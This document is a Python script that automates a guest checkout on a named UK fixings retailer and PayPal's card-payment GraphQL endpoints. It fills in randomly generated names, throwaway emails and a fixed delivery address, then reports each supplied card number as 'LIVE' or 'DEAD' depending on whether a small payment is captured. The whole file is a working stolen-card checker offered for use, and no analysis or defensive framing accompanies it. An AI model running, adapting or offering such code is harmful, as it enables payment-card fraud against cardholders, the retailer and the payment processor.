#!/usr/bin/env python3
import requests
import random
import string
import sys
import json
import re
import time
from bs4 import BeautifulSoup

s = requests.Session()

def generate_random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"

def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khalid", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", 
                   "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", 
                   "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", 
                   "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", 
                   "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", 
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", 
                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", 
                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", 
                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
                   
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", 
                  "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", 
                  "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", 
                  "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", 
                  "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", 
                  "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", 
                  "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", 
                  "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", 
                  "Watson", "Webb", "White", "Young"]
    
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def check_paypal(card):
    try:
        n, mm, yy, cvc = card.split('|')
        
        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            full_yy = f'20{yy}'
        else:
            full_yy = yy
        
        paypal_expiry = f"{full_yy}-{mm}"
        
        # Generate user data
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        
        # Step 1: Add to cart
        headers1 = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.tcfixings.co.uk',
            'Referer': 'https://www.tcfixings.co.uk/product/timco-index-timber-screws-67mm-x-60mm-box-of-50/10410',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        cart_data = {
            'qty_box': '1',
            'product_id': '10410',
            'product_price': '4.3688',
            'product_type': '1',
            'product_unit': 'each',
            'vatcode': '1.2',
            'box_size': '0',
            'multibox': '-1',
            'special_offer_id': '',
            'addToBasketMethod': 'Product Page'
        }
        
        s.post('https://www.tcfixings.co.uk/main/basket/add_to_basket/', headers=headers1, data=cart_data, timeout=15)
        
        # Step 2: Go to checkout
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        s.get('https://www.tcfixings.co.uk/checkout', headers=headers2, timeout=15)
        
        # Step 3: Set customer details
        headers3 = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.tcfixings.co.uk',
            'Referer': 'https://www.tcfixings.co.uk/checkout-new',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        }
        
        customer_data = {
            'fname': first_name,
            'lname': last_name,
            'phone': '50628429418',
            'com_name': '',
            'email1': generate_random_email(),
            'email2': '',
            'update_details': 'yes'
        }
        
        s.post('https://www.tcfixings.co.uk/main/checkout_new/setCustomerDetails', headers=headers3, data=customer_data, timeout=15)
        
        # Step 4: Set delivery address
        s.get('https://www.tcfixings.co.uk/checkout-new', headers=headers2, timeout=15)
        
        delivery_data = {
            'delcontact_name': '',
            'delcontact_phone': '',
            'delcom_name': '',
            'deladd_1': 'PO Box 10080',
            'deladd_2': '',
            'deladd_town': 'Melton Mowbray',
            'deladd_county': 'Leicestershire',
            'deladd_postcode': 'LE13 9EE',
            'deladd_email': generate_random_email(),
            'deladd_country': 'GB',
            'same_billing_as_del': 'no'
        }
        
        s.post('https://www.tcfixings.co.uk/main/checkout_new/setDeliveryAddress', headers=headers3, data=delivery_data, timeout=15)
        
        # Step 5: Set delivery method
        s.get('https://www.tcfixings.co.uk/checkout-new', headers=headers2, timeout=15)
        
        delivery_method_data = {
            'delivery-option': 'CARRM48P|Royal Mail 48 Tracked 3-5 Working Days|3.75',
            'txtreference': '',
            'txtcomment': ''
        }
        
        s.post('https://www.tcfixings.co.uk/main/checkout_new/setDeliveryMethod', headers=headers3, data=delivery_method_data, timeout=15)
        
        # Step 6: Set billing method
        s.get('https://www.tcfixings.co.uk/checkout-new', headers=headers2, timeout=15)
        
        billing_data = {
            'billing_details': 'use_billing_address'
        }
        
        s.post('https://www.tcfixings.co.uk/main/checkout_new/setBillingMethod', headers=headers3, data=billing_data, timeout=15)
        
        # Step 7: Initialize PayPal
        s.get('https://www.tcfixings.co.uk/checkout-new', headers=headers2, timeout=15)
        
        headers4 = {
            'Accept': '*/*',
            'Origin': 'https://www.tcfixings.co.uk',
            'Referer': 'https://www.tcfixings.co.uk/checkout-new',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        }
        
        s.post('https://www.tcfixings.co.uk/main/paypalNew/paypalsmartcheckoutclick', headers=headers4, timeout=15)
        
        # Step 8: Create PayPal order
        headers5 = {
            'authority': 'www.paypal.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        }
        
        order_data = {
            'purchase_units': [{
                'amount': {
                    'currency_code': 'GBP',
                    'value': '14.99'
                },
                'shipping': {
                    'name': {'full_name': f'{first_name} {last_name}'},
                    'address': {
                        'address_line_1': 'PO Box 10080',
                        'address_line_2': '',
                        'admin_area_1': 'Leicestershire',
                        'admin_area_2': 'Melton Mowbray',
                        'postal_code': 'LE13 9EE',
                        'country_code': 'GB'
                    }
                },
                'shipping_preference': 'SET_PROVIDED_ADDRESS'
            }],
            'payment_source': {
                'paypal': {
                    'name': {'given_name': first_name, 'surname': last_name},
                    'email_address': generate_random_email(),
                    'phone': {
                        'phone_type': 'MOBILE',
                        'phone_number': {'national_number': '50628429418'}
                    },
                    'address': {
                        'address_line_1': 'PO Box 10080',
                        'address_line_2': '',
                        'admin_area_1': 'Leicestershire',
                        'admin_area_2': 'Melton Mowbray',
                        'postal_code': 'LE13 9EE',
                        'country_code': 'GB'
                    },
                    'experience_context': {'shipping_preference': 'SET_PROVIDED_ADDRESS'}
                }
            },
            'intent': 'CAPTURE'
        }
        
        order_response = s.post('https://www.paypal.com/v2/checkout/orders', headers=headers5, json=order_data, timeout=15)
        order_json = order_response.json()
        
        if 'id' not in order_json:
            return {"status": "DEAD", "msg": "Failed to create PayPal order"}
        
        order_id = order_json['id']
        
        # Step 9: Get checkout details
        headers6 = {
            'authority': 'www.paypal.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'paypal-client-context': order_id,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-app-name': 'smart-payment-buttons'
        }
        
        query_data = {
            'query': '\n        query GetCheckoutDetails($orderID: String!) {\n            checkoutSession(token: $orderID) {\n                cart {\n                    billingType\n                    productCode\n                    intent\n                    paymentId\n                    billingToken\n                    amounts {\n                        total {\n                            currencyValue\n                            currencyCode\n                        }\n                    }\n                    supplementary {\n                        initiationIntent\n                    }\n                    category\n                }\n                flags {\n                    isChangeShippingAddressAllowed\n                }\n                payees {\n                    merchantId\n                    email {\n                        stringValue\n                    }\n                }\n            }\n        }\n        ',
            'variables': {'orderID': order_id}
        }
        
        s.post('https://www.paypal.com/graphql?GetCheckoutDetails', headers=headers6, json=query_data, timeout=15)
        
        # Step 10: Update client config
        update_data = {
            'query': '\n            mutation UpdateClientConfig(\n                $orderID : String!,\n                $fundingSource : ButtonFundingSourceType!,\n                $integrationArtifact : IntegrationArtifactType!,\n                $userExperienceFlow : UserExperienceFlowType!,\n                $productFlow : ProductFlowType!,\n                $buttonSessionID : String\n            ) {\n                updateClientConfig(\n                    token: $orderID,\n                    fundingSource: $fundingSource,\n                    integrationArtifact: $integrationArtifact,\n                    userExperienceFlow: $userExperienceFlow,\n                    productFlow: $productFlow,\n                    buttonSessionID: $buttonSessionID\n                )\n            }\n        ',
            'variables': {
                'orderID': order_id,
                'fundingSource': 'card',
                'integrationArtifact': 'PAYPAL_JS_SDK',
                'userExperienceFlow': 'INLINE',
                'productFlow': 'SMART_PAYMENT_BUTTONS'
            }
        }
        
        s.post('https://www.paypal.com/graphql?UpdateClientConfig', headers=headers6, json=update_data, timeout=15)
        
        # Step 11: Get card fields page
        params = {
            'token': order_id,
            'sessionID': 'uid_67eafbeb96_mtq6mdi6ndm',
            'buttonSessionID': 'uid_7bc5380dbb_mtq6mti6mdq',
            'locale.x': 'en_GB',
            'commit': 'true',
            'style.submitButton.display': 'true',
            'hasShippingCallback': 'false',
            'env': 'production',
            'country.x': 'GB'
        }
        
        s.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers2, timeout=15)
        
        # Step 12: Get total allowed overcapture
        headers7 = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'paypal-client-context': order_id,
            'paypal-client-metadata-id': order_id,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-app-name': 'standardcardfields',
            'x-country': 'GB'
        }
        
        overcapture_data = {
            'query': '\n              query (\n                $countryCode: CountryCodes,\n                $ecToken: String!\n              ) {\n                checkoutSession(token: $ecToken) {\n                  cart(country: $countryCode){\n                    totalAllowedOverCaptureAmount {\n                      currencyFormatSymbolISOCurrency\n                    }\n                  }\n                }\n              }\n        ',
            'variables': {'billingCountry': 'GB', 'ecToken': order_id}
        }
        
        s.post('https://www.paypal.com/graphql?total_allowed_overcapture_amount_gb', headers=headers7, json=overcapture_data, timeout=15)
        
        # Step 13: Submit payment
        payment_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': n,
                    'type': 'MASTER_CARD',
                    'expirationDate': paypal_expiry,
                    'postalCode': 'LE13 9EE',
                    'securityCode': cvc
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': 'PO Box 10080',
                    'line2': '',
                    'city': 'Melton Mowbray',
                    'state': 'Leicestershire',
                    'postalCode': 'LE13 9EE',
                    'country': 'GB'
                },
                'email': generate_random_email(),
                'currencyConversionType': 'PAYPAL'
            }
        }
        
        payment_response = s.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers7, json=payment_data, timeout=20)
        response_text = payment_response.text
        
        # Check result
        if 'COMPLETED' in response_text or 'Payment captured successfully' in response_text:
            return {"status": "LIVE", "msg": "Payment captured"}
        elif 'CARD_GENERIC_ERROR' in response_text:
            return {"status": "DEAD", "msg": "Card generic error"}
        elif 'declined' in response_text.lower():
            return {"status": "DEAD", "msg": "Card declined"}
        else:
            return {"status": "DEAD", "msg": "Payment failed"}
            
    except Exception as e:
        return {"status": "DEAD", "msg": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"status": "DEAD", "msg": "No card provided"}))
        sys.exit(1)
    
    card = sys.argv[1]
    result = check_paypal(card)
    print(json.dumps(result))
